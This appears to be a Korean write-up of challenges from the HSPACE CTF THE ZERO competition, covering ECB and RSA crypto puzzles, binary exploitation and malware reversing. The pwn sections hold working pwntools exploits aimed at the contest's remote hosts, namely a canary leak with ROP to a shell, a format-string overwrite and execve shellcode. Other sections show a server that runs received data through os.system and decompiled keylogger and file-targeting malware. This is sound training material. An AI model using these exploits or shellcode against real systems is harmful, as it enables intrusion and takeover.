![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_24.png)

FLAG: hspace{Vu!lner0able_9an13d0ro6id_1a3p3p1}

## [CRYPTO] electronic codebook

간단한 ECB 문제입니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2049.png)

문제 페이지에서 간단하게 사용법을 확인할 수 있으며

페이지 소스보기를 통해 문제의 소스코드를 확인할 수 있습니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2050.png)

```python
from flask import Flask, request, render_template_string 
from hashlib import md5
from base64 import b64decode, b64encode
from Crypto.Cipher import AES

from hspace import *

BLOCK_SIZE = 16  # Bytes

app = Flask(__name__)
app.secret_key = secret_key 

pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

class AESCipher:
    def __init__(self, key):
        self.key = md5(key.encode('utf8')).hexdigest()

    def encrypt(self, raw):
        raw = pad(raw)
        cipher = AES.new(self.key.encode("utf8"), AES.MODE_ECB)
        return b64encode(cipher.encrypt(raw.encode('utf8')))

    def decrypt(self, enc):
        enc = b64decode(enc.encode('utf8'))
        cipher = AES.new(self.key.encode("utf8"), AES.MODE_ECB)
        return unpad(cipher.decrypt(enc)).decode('utf8')

target = "i am king got admin!"

@app.route('/')
def main():
  return "<h1>ECB</h1><br>/enc?value=<br>/dec?value=<!-- /source -->"

@app.route('/enc') 
def ecb_enc():
  data = request.args.get('value') or None
  if data == None:
    return "need argument..."
  if target in data:
    return "nono..."

  try:
    return AESCipher(pwd).encrypt(data)
  except Exception as e:
    return "error!"+str(e)

@app.route('/dec')
def ecb_dec():
  data = request.args.get('value') or None
  data = data.replace(" ","+")
  if data == None:
    return "need argument..."
  try:
    dec_data = AESCipher(pwd).decrypt(data)
    if target == dec_data:
      # here is your FLAG!
      return flag
    else:
      return dec_data
  except Exception as e:
    return "error!"+str(e)  

@app.route('/source')
def view_code():
  return open('app.py','r').read()

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=5000)
```

ecb_dec함수에서 복호화를 했을 때, target 변수인 "i am king got admin!"과 일치하면 flag를 반환하는 문제입니다.

하지만 ecb_enc 함수에서 "i am king got admin!" 이 있을 경우 암호화를 하지 않는 것을 확인할 수 있습니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2051.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2052.png)

ecb 암호화는 블록 단위로 암호화를 진행하기 때문에 블록 단위로 끊어서 "i am king got admin!" 문자열을 암호화 한 후 연결하여 다시 복호화 하면 문제를 해결 할 수 있습니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2053.png)

```python
import base64
import requests
import urllib.parse as up

url    = "http://ecb.imreplay.com"

target = "i am king got admin!"
target1 = target[:16]
target2 = target[16:]
print(f"t1 = {target1}\nt2 = {target2}")

r1 = requests.get(f"{url}/enc?value={target1}").text
print(f"r1 = {r1}")

r2 = requests.get(f"{url}/enc?value={target2}").text
print(f"r2 = {r2}")

r1 = base64.b64decode(r1.encode())
r2 = base64.b64decode(r2.encode())

data = r1[:16]+r2
data = base64.b64encode(data)
data = up.quote(data)

flag = requests.get(f"{url}/dec?value={data}").text
print(flag)
```

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2054.png)

FLAG: hspace{Hell0_Electr0nic_C0deBook!}

## [CRYPTO] Baby_crypto

- 문제 출제 의도 : 간단한 패킷 분석 능력과 RSA 암호화 알고리즘의 이해 및 복호화 실습을 위해 제출 하였습니다.

**[문제 구성]**

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2055.png)

 문제를 확인해 보면 Packet Capture 도구로 확인할 수 있는 .pcapng 파일 하나를 다운 받을 수 있습니다.

해당 문제는 아래와 같은 과정을 거쳐서 만들어졌습니다.

```python
/*client*/
from socket import *
import time

p = (2**127)-1
q = (2**107)-1
n = p * q
e = 65537

phi = (q-1)*(p-1)

clientSock = socket(AF_INET, SOCK_STREAM)
clientSock.connect(('192.168.40.144', 7777))

msg = 'hspace{1_w4nt_t0_b3_4_zz4ngzz4ng_H4ck3r!!}'

def get_private_key(e, phi):
    k=1
    while(e*k)%phi != 1 or k ==e:
        k+=1
    return k

def encrypt(e, n, plaintext):
    public_key  = e
    cipher = [(ord(char) ** public_key) % n for char in plaintext]

    return cipher

def decrypt(d, n, cipher_text):
    key = d
    plain = [chr((char ** key) % n ) for char in cipher_text]

    return "".join(plain)

print(type(clientSock))

cipher_msg = encrypt(e, n, msg)

clientSock.sendall("ls".encode('utf-8'))

clientSock.close()
```

클라이언트는 공개키를 이용해 Plaintext를 한 글자씩 암호화한 후 UDP 통신을 사용해 Server에 송신합니다.

```python
/*server*/
from socket import *
import os

serverSock = socket(AF_INET, SOCK_STREAM)
serverSock.bind(('192.168.40.144', 7777))
serverSock.listen(1)

clientSock, addr = serverSock.accept()

while(1):
    client_data = serverSock.recv(1024)
    print(client_data)
    os.system(str(client_data.decode('utf-8')))
    if client_data == "end":
        break
    print(client_data)
    

serverSock.close()
```

암호화된 text가 담긴 패킷은 7777포트를 이용하여 한 글자씩 전송됩니다. 

이때 패킷 분석을 어렵게 하기 위해 script구문을 실행시켜 더미 패킷을 추가하였습니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2056.png)

위 그림과 같이 7777번 포트로 암호화된 값이 들어오는 것을 확인 할 수 있습니다.

**[문제 풀이]**

여러분에게는  n과 e 값이 있습니다. n의 길이는 비교적 짧으며 e의 값도 65537입니다.

1. 암복호와 툴을 사용하여 패킷의 암호화 코드로부터 평문을 뽑아냅니다.

```bash
python3 RsaCtfTool.py -n 27606985387162255149739023449107931668458716142620601169954803000803329 -e 65537 --uncipher 27316745514101158385900734386295186110095058620648243002845123389986041
```

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2057.png)

그 결과 그림과 같이 긴 string이 하나의 문자인 것을 확인할 수 있습니다.

남은 패킷에도 위 과정을 적용해주면 flag를 획득할 수 있습니다.

가장 쉬우면서도 빠른 방법입니다.

2. 직접 코드를 작성하여 복호화를 시도합니다.

$$P = C^d mod(n)$$

개인키 d 값을 알기 위해 phi 값이 필요합니다. 

n값의  크기가 작기 때문에 phi 값을 구하기가 비교적 수월합니다.

정수 인수분해 계산기를 통해 phi 값을 구해냅니다.(직접 코드를 작성해도 좋습니다!)

이때 phi = 27606985387162255149739023449107761527112996396559656119259509106409476이 나옵니다.

**python code to Decryption**

```python
from gmpy2 import *

n = 27606985387162255149739023449107931668458716142620601169954803000803329
e = 65537
phi = 27606985387162255149739023449107761527112996396559656119259509106409476
#d = divm(1, e, phi)
#d = invert(e, phi)

print(d)

crypto =[
27316745514101158385900734386295186110095058620648243002845123389986041,
8142079287916652568932804601205837242496310109866232196019822529887053,
26090937741967256528490882060405710044623048396371529861477958948488740,
20689318060990831905551173102000242056716750852747860614320457155844751,
19318394092050673441664278189645936731148655811171928555544276008109709,
3748022726397618855412730898316585913377073472384407425945520023324246,
13056217731878391056382517437204571759729475553887344092823453555010151,
9917395344429272355524429544837761929473554508203842016077371215591551,
13176419365557272430324435004225330322380427888842754816869934474497220,
9532574409901189334797348878856071641047295777308127906066879976146700,
780757980829311560541496599608074119046681534016243912313196266272656,
12801762651168911244444671235565507237120835804115390045534299156591534
//이하 생략
 ]

result =''

for i in range(len(crypto)):
	result += chr(int((hex(pow(crypto[i], d, n))), 16))
	print("Current Plaintext : " + result)

print("flag : " + result)
```

C (암호문), d (개인키), n (p, q의 곱) 우리가 알고 있는 것은 이 3가지입니다.

$$P = C^d mod (n) $$

이기에 우리는 평문을 구할 수 있습니다. 

pow를 사용하여 값을 처리해 줍니다!

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2058.png)

그럼 위 그림과 같이 flag를 얻을 수 있습니다.

FLAG: hspace{1_w4nt_t0_b3_4_zz4ngzz4ng_H4ck3r!!}

## [CRYPTO] Desperado

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__12.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__13.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__14.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__15.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__16.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__17.png)

FLAG: hspace{Did_you_know_parity_bits_are_ignored_in_DES?}

## [SYSTEM] Seoul Housing

```python
w**FROM ubuntu:18.04**

Arch:     amd64-64-little
RELRO:    **Full RELRO**
Stack:    **Canary found**
NX:       **NX enabled**
PIE:      **PIE enabled**
```

- 실행결과

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2059.png)

- main()

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2060.png)

- welcome() [offset **0x88A**]

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2061.png)

- **Red Box** : **Canary**
- **Purple Box** : **SFP(Stack Frame Pointer)**
- **Green Box** : **RET**

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2062.png)

- init()
- &[pop r15; ret] + 1 → [pop rdi; ret]

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2063.png)

- exploit.py

```python
from pwn import *

bi = './chall'
#r = process([bi], env={'LD_PRELOAD':''})
r = remote('183.109.94.101', 9100)
e = ELF(bi)
context.arch = 'amd64'

welcome = 0x88a

pay = 'A'*0x109
r.sendafter('input > ', pay)
r.recvuntil(pay)
canary = u64(r.recv(7).rjust(8,'\x00'))
base = u64(r.recv(6).ljust(8,'\x00')) - 0xa10
log.info("canary @ {}".format(hex(canary)))
log.info("base @ {}".format(hex(base)))

sh = base + e.search('sh').next() # ps -ash
system = base + welcome + 11 # call system
prdi = base + e.search(asm('pop rdi; ret')).next()

pay = 'A'*0x108
pay += p64(canary)
pay += 'B'*8
pay += p64(prdi)
pay += p64(sh)
pay += p64(system)
r.sendafter('input > ', pay)

r.interactive()
```

FLAG: hspace{glaD_yoU_havE_thE_sH_strinG}

## [SYSTEM] Financial Stability Forum

```python
**FROM ubuntu:18.04**

Arch:     amd64-64-little
RELRO:    **Full RELRO**
Stack:    **Canary found**
NX:       **NX enabled**
PIE:      **PIE enabled**
```

- 실행결과

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2064.png)

- main()

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2065.png)

- fsb(Format String Bug)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2066.png)

- exploit.py

```python
from pwn import *

bi = './chall'
#r = process([bi], env={'LD_PRELOAD':''})
r = remote('183.109.94.101', 9101)
context.arch = 'amd64'

pay = '%p|'*8
r.sendlineafter('> ', pay)
leak = r.recvline().strip().split('|')
print leak
libc = int(leak[2], 16) - 0x110151
stack = int(leak[5], 16) - 0xe0 # ret
print hex(libc), hex(stack)

pay = fmtstr_payload(8, {stack: libc+0x4f3d5}) # one_gadget
r.sendlineafter('> ', pay)

r.interactive()
```

FLAG: hspace{typinG_2_iS_toO_easY}

## [SYSTEM] No sc

```python
**FROM ubuntu:18.04**

Arch:     amd64-64-little
RELRO:    **Full RELRO**
Stack:    No canary found
NX:       **NX enabled**
PIE:      **PIE enabled**
```

- 실행결과

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2067.png)

- main()

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2068.png)

- x64 Shell Code

```python
/* execve(path='/bin///sh', argv=['sh'], envp=0) */
/* push '/bin///sh\x00' */
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax
mov rdi, rsp
/* push argument array ['sh\x00'] */
/* push 'sh\x00' */
push 0x1010101 ^ 0x6873
xor dword ptr [rsp], 0x1010101
xor esi, esi /* 0 */
push rsi /* null terminate */
push 8
pop rsi
add rsi, rsp
push rsi /* 'sh\x00' */
mov rsi, rsp
xor edx, edx /* 0 */
/* call execve() */
push SYS_execve /* 0x3b */
pop rax
syscall
```

- exploit.py

```python
from pwn import *

bi = './chall'
#r = process([bi], env={'LD_PRELOAD':''})
r = remote('183.109.94.101', 9102)
context.arch = 'amd64'

r.sendline(asm(shellcraft.amd64.linux.sh()))
r.interactive()
```

FLAG: hspace{sC_iN_koreA_iS_biG_deaL}

## [SYSTEM] Gambling 1

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__3.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__4.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__5.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__6.png)

FLAG: hspace{Let's_go_up_to_100_million_Bitcoin!!}

## [SYSTEM] Gambling 2

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__8.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__9.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__10.png)

FLAG: hspace{money_can_be_copied!!!}

## [MALWARE] Baby_Keylogger

- 문제 의도 : 키 입력을 후킹하기 위한 SetWindowsHookEx 함수 및 내부에서 동작하는 코드 이해, 간단한 Encoding 함수를 리버싱하여 원래의 키 배열을 복구 할 수 있는지를 확인함.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2069.png)

파일을 다운로드 받으면 .exe 파일 1개, 암호화된 flag 파일 1개를 다운로드 받을 수 있습니다.

```python
v0 = GetModuleHandleA(0i64);
  result = SetWindowsHookExA(13, KeyBoardProc, v0, 0);
  hHook = result;
```

SetWindowsHookExA 함수를 사용해 KEYBOARD_LL (13)과 Callback 함수 KeyBoardProc 함수를 실행시킵니다.

```cpp

//KeyBoard Cap Lock Check
Caps_Lock = GetKeyState(20);

GetLocalTime(&SystemTime);
to_string((std::__cxx11 *)v16, SystemTime.wMonth);
basic_string<char,std::char_traits<char>,std::allocator<char>>::append(v14, v16);
basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v16);
to_string((std::__cxx11 *)v17, SystemTime.wDay);
basic_string<char,std::char_traits<char>,std::allocator<char>>::append(v14, v17);
basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v17);
to_string((std::__cxx11 *)v18, SystemTime.wHour);
basic_string<char,std::char_traits<char>,std::allocator<char>>::append(v14, v18);
basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v18);
to_string((std::__cxx11 *)v19, SystemTime.wMinute);
basic_string<char,std::char_traits<char>,std::allocator<char>>::append(v14, v19);
basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v19);
basic_string<char,std::char_traits<char>,std::allocator<char>>::append(v14, ".txt");

// [Month, Day, Hour, Minute].txt file open
if ( (unsigned __int8)std::ofstream::is_open(&out) != 1 )
    std::ofstream::open(&out, v14, 1i64);
```

GetKeyState(VK_CAPITAL)를 사용해 키보드에 Caps_Lock이 걸려있는지 확인 후

GetLocalTime을 사용해 시스템의 시간을 불러와 [월, 일, 시, 분].txt 파일을 생성하기 위한 문자열을 저장 후 파일을 open 시킵니다.

```cpp
if ( !code )
  {
    if ( wParam == 256 || wParam == 260 )
      *(_QWORD *)&pKey.vkCode = lParam;
```

콜백함수인 KeyBoardProc의 매개변수 code, wParam을 확인하는 과정입니다.

code에 값이 있고 wParam이 WM_KEYDOWN 또는 WM_SYSKEYDOWN일 상태만 후킹을 진행합니다.

PKBDLLHOOKSTRUCT 구조체 변수인 pKey.vkCode에 lParam 값을 넣습니다.

```cpp
//Get ForegroundWindow Text
ForegroundWindow = GetForegroundWindow();
WindowsText = GetWindowTextA(ForegroundWindow, String, 1000);

//cotp Foreground Text
std::allocator<char>::allocator(&v20);
basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(copy_windowsText, String, &v20);
std::allocator<char>::~allocator(&v20);

//Key Input Time check
GetLocalTime(&SystemTime);
basic_string<char,std::char_traits<char>,std::allocator<char>>::append(v13, "[");
to_string((std::__cxx11 *)v21, SystemTime.wMonth);
basic_string<char,std::char_traits<char>,std::allocator<char>>::append(v13, v21);
basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v21);
basic_string<char,std::char_traits<char>,std::allocator<char>>::append(v13, "_");
to_string((std::__cxx11 *)v22, SystemTime.wDay);
basic_string<char,std::char_traits<char>,std::allocator<char>>::append(v13, v22);
basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v22);
basic_string<char,std::char_traits<char>,std::allocator<char>>::append(v13, "_");
to_string((std::__cxx11 *)v23, SystemTime.wHour);
basic_string<char,std::char_traits<char>,std::allocator<char>>::append(v13, v23);
basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v23);
basic_string<char,std::char_traits<char>,std::allocator<char>>::append(v13, ":");
to_string((std::__cxx11 *)v24, SystemTime.wMinute);
basic_string<char,std::char_traits<char>,std::allocator<char>>::append(v13, v24);
basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v24);
basic_string<char,std::char_traits<char>,std::allocator<char>>::append(v13, ":");
to_string((std::__cxx11 *)v25, SystemTime.wSecond);
basic_string<char,std::char_traits<char>,std::allocator<char>>::append(v13, v25);
basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v25);
basic_string<char,std::char_traits<char>,std::allocator<char>>::append(v13, "]");

```

GetForegroundWindows, GetWindowsTextA 함수를 사용해 사용자가 보고있는 화면의 캡션 정보를 가져옵니다.  또한 copy_windowText에 복사합니다.

GetLocalTime 함수를 사용해 사용자가 현재 화면을 보고있는 시간을 가져옵니다.

형식은 [월_일_시:분:초]로 저장이 됩니다.

```cpp
if ( (unsigned __int8)std::operator!=<char>(&Copy_windowText, v10) )
{
	v4 = std::operator<<<char>(&out, v13);
	std::operator<<<std::char_traits<char>>(v4, "\t");
	v5 = std::operator<<<char>(&out, &Copy_windowText);
	std::operator<<<std::char_traits<char>>(v5, "\n");
	encrypt_text[abi:cxx11](Hook_Text);
	std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(v12, Hook_Text);
	std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(Hook_Text);
	v6 = std::operator<<<char>(&out, v12);
	std::ostream::operator<<(v6, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);
	v7 = std::operator<<<std::char_traits<char>>(&out, "\r\n");
	std::ostream::operator<<(v7, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);
	std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(&Copy_windowText, v10);
	std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::clear(&Key_Input[abi:cxx11]);
}
```

copy_windowText에 있는 내용과 새로 가져온 ForegroundWindow의 내용이 다르면 후킹한 내용을 저장하는 코드입니다. 중간에 보시면 encrypt_text 함수에 Hook_Text를 매개변수로 넣어주고 암호화를 진행합니다.

```cpp
std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(KeyStream, "MIXMIX", &v8);
qmemcpy(Table, "Pk*F|Y_%Ov=BTQRc/}#^mbiKrj!p1qyMea0X$d.hA7'6[&lxs5wD4Z({z]8@u?<oVEWNn\\I+L)UfCH9SJ,G3`;\">g-t2:~", 94);

for ( i = 0; i < v13; ++i )
  {
    v2 = Table[*(char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator[](
                          &Key_Input[abi:cxx11],
                          i)
             - 33];
    v3 = (_BYTE *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator[](
                    KeyStream,
                    i % 6);
    *((_DWORD *)v12 + i) = (char)(*v3 ^ v2);
  }
```

Hook_Text의 값을 가지고 Table에서 값을 가져오고 KeyStream과 xor하는 간단한 암호화 과정입니다.

```cpp
v10 = 15;
  for ( i = 0; i < v13; ++i )
  {
    v14 = 0x80;
    for ( j = 0; j <= 7; ++j )
    {
      if ( v14 == (v14 & *((_DWORD *)v12 + i)) )
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::append(a1, &a0123456789[1]);
      else
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::append(a1, a0123456789);
      v14 >>= 1;
    }
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::append(a1, "^.^");
  }
```

위에서 연산했던 값을 가지고 2진수로 표현하는 코드입니다. 2중 for문의 루틴이 끝나면 경계를 표시하기 위한 "^.^" 문자열이 추가됩니다.

flag.txt에 있는 내용을 복호화 하기위한 코드를 작성하면 다음과 같습니다.

```cpp
a = """Pk*F|Y_%Ov=BTQRc/}#^mbiKrj!p1qyMea0X$d.hA7'6[&lxs5wD4Z({z]8@u?<oVEWNn\I+L)UfCH9SJ,G3`;">g-t2:~"""
key = "MIXMIX"
c = []
d = []

k= ["01100110", "00001110", "00001011", "00011011", "00011110", "00110110", "00111001", "00101000", "00010101", "00001000", "00101110", "01100100", "01101010", "00110100", "00111111", "01100010", "01110000", "00111011", "00100001", "00000000", "00010001", "01101110", "01100101", "00001000", "00011101","01110011"]

for i in range(len(k)):
    c.append(int(k[i], 2))

for i in range(0, len(c)):
	d.append(a.index(chr((c[i] ^ ord(key[i%6]))))+33)

print("".join(map(chr,d)))
```

FLAG: hspace{B@by_K2y1o0Ogg3r!!}

## [MALWARE] tiny malware

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2070.png)

- 파일을 다운로드하면 exe 파일과 암호화된 파일 여러개를 다운로드 받을 수 있습니다.

```cpp
*(_DWORD *)ModuleName = 0xCE9EB36B;
*(_DWORD *)(ModuleName+1) = 0x63CA6652;
v0 = ModuleName;

for ( i = 0; i < 8; ++i )
{
  v2 = *v0++;
  v3 = __ROL1__(i ^ v2, i);
  *(v0 - 1) = v3;
}
v4 = GetModuleHandleA(ModuleName);
```

IDA로 파일을 열어보면 ModuleName이라는 변수에 특정한 값을 저장후 ROR 연산을 거쳐 GetModuleHandleA를 호출하고 있음을 알 수 있습니다.

ModuleName에 저장된 값을 for문 연산을 거쳐 확인해보면 "kernel32.dll"을 호출하는 것을 알 수 있습니다.

```cpp
*(_DWORD *)v105[0].enc = 0x6B1FB347;
v5 = v4;
*(_DWORD *)&v105[0].enc[4] = 0xEDC76EF2;
*(_DWORD *)&v105[0].enc[8] = 0xC296BB7C;
v105[1].size = 14;
v6 = &v105[0].size;
*(_DWORD *)&v105[0].enc[12] = 0x8D9B661A;
v7 = 9i64;

						.
					(중략)
						.

*(_DWORD *)&v105[5].enc[12] = 0x18;
*(_DWORD *)v105[6].enc = 0x8F99B546;
*(_DWORD *)&v105[6].enc[4] = 0xE1BB6630;
*(_DWORD *)&v105[6].enc[8] = 0x6D;
v105[6].size = 9;
*(_DWORD *)v105[7].enc = 0x6DD93743;
*(_DWORD *)&v105[7].enc[4] = 0xDB834752;

						.
					(중략)
						.

v14 = (unsigned __int64)v8++ ^ (unsigned __int64)GetProcAddress(v5, ProcName);
```

분석을 계속해서 진행하면 v105의 변수에 구조체 배열이 있는 것을 확인할 수 있습니다.

ModuleName과 동일하게 특정한 값을 대입하고 있는 것으로 보아 아래 특정 연산을 통해 GetProcAddress의 변수로 지정될 것으로 보입니다. 따로 코드를 짜서 확인해도 되지만 x64dbg Logging 기능을 사용해 GetProcAddress의 변수의 입력값을 확인해보도록 하겠습니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2071.png)

다음과 같이 GetProcAddress 함수를 call 하는 부분에 BP를 설정하고 Logging을 설정해서 Logging 탭에 들어가 확인하면

```cpp
v105[0] = "GetComputerNameA"
v105[1] = "FindFirstFileA"
v105[2] = "CreateFileA"
v105[3] = "WriteFile"
v105[4] = "ReadFile"
v105[5] = "FindNextFileA"
v105[6] = "FindClose"
v105[7] = "CloseHandle"
v105[8] = "DeleteFileA"
```

각 구조체 별로 위와 같은 함수를 가지고 있음을 알 수 있습니다.

```cpp
LENGTH = 16;
  if ( !((unsigned int (__fastcall *)(char *, unsigned int *))((unsigned __int64)v105 ^ v105[0].fn))(
          Computer_name,
          &LENGTH) )                            // GetComputerNameA
    return 0xFFFFFFFFi64;
  v15 = LENGTH;
  v16 = Computer_name;
  CRC32_Calc = -1;
  if ( LENGTH )                                 // crc32
  {
    do
    {
      v18 = *v16++;
      v19 = ((v18 ^ CRC32_Calc) >> 1) ^ -(((unsigned __int8)v18 ^ (unsigned __int8)CRC32_Calc) & 1) & 0xEDB88320;
      v20 = (((v19 >> 1) ^ -(v19 & 1) & 0xEDB88320) >> 1) ^ -(((unsigned __int8)(v19 >> 1) ^ -(v19 & 1) & 0x20) & 1) & 0xEDB88320;
      v21 = (((v20 >> 1) ^ -(v20 & 1) & 0xEDB88320) >> 1) ^ -(((unsigned __int8)(v20 >> 1) ^ -(v20 & 1) & 0x20) & 1) & 0xEDB88320;
      v22 = (((v21 >> 1) ^ -(v21 & 1) & 0xEDB88320) >> 1) ^ -(((unsigned __int8)(v21 >> 1) ^ -(v21 & 1) & 0x20) & 1) & 0xEDB88320;
      CRC32_Calc = (v22 >> 1) ^ -(v22 & 1) & 0xEDB88320;
      --v15;
    }
    while ( v15 );
  }
```

GetComputerNameA 함수로 프로그램이 동작하는 컴퓨터의 이름을 가져오며 CRC32를 통해 계산된 값을 CRC32_Calc 변수에 값을 저장합니다.

제 컴퓨터에서 동작을 시키면 DESKTOP-98O9G12의 이름을 가지고 CRC32_Calc 변수에는 0xe905d8db 값이 저장되게 됩니다.

```cpp
table_15_ = ~CRC32_Calc;                      // DESKTOP-98O9G12, 0xe905d8db
*lpFileName = 0xE151C43;
*(lpFileName+1)=  0xA7D6A66D
*(lpFileName+2) = 0xC1838633;
*(lpFileName+3) = 0xE79B9E3A;
v23 = 0;
v24 = &lpFileName;
LODWORD(lpFileName) = 0x13123F63;     // C:\\hspace_secrets\\*
do
{
  v25 = *(_BYTE *)v24;
  v24 = (int *)((char *)v24 + 1);
  v26 = __ROL1__(v23 ^ v25, v23);
  ++v23;
  *((_BYTE *)v24 - 1) = v26;
}
while ( v23 < 20 );
BYTE2(lpFileName) = '*';              // C:\\hspace_secrets\\*
```

앞에서 CRC32를 통해 계산된 값을 전역변수로 선언되어있는 table[15]에 값을 저장합니다.

또한 lpFileName에도 특정한 값을 넣고 do ~ while문을 통해 복호화됩니다.

복호화된 값을 확인해보면 "C:\\hspace_secrets\\"에 관한 문자열을 확인할 수 있습니다.

최종적으로 생성되는 lpFileName의 문자열은 "C:\\hspace_secrets\\*"을 가지게 됩니다.

```cpp
FindFirstFileA_Handle = ((__int64 (__fastcall *)(int *, WIN32_FIND_DATA *))((unsigned __int64)v104[1].enc ^ v104[1].fn))(
                            &lpFileName,
                            &lpFindFileData);   // FindFirstFileA
  v27 = FindFirstFileA_Handle;
  if ( FindFirstFileA_Handle == -1 )
```

